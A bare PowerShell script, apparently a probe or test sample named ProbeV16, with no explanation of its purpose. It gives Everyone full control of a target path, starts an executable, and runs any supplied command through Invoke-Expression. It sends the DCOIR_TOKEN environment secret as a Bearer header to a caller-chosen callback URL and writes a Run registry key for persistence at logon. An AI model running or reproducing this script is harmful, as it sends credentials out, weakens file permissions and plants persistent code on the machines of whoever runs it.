param(
    [string]$Executable,
    [string]$Args,
    [string]$TargetPath,
    [string]$Callback,
    [string]$SecretText,
    [string]$Command
)
$secret = ConvertTo-SecureString $SecretText -AsPlainText -Force
$acl = Get-Acl $TargetPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.SetAccessRule($rule)
Set-Acl -Path $TargetPath -AclObject $acl
Start-Process -FilePath $Executable -ArgumentList $Args -Wait
IEX $Command
Invoke-RestMethod -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name ProbeV16 -Value $Executable -Force
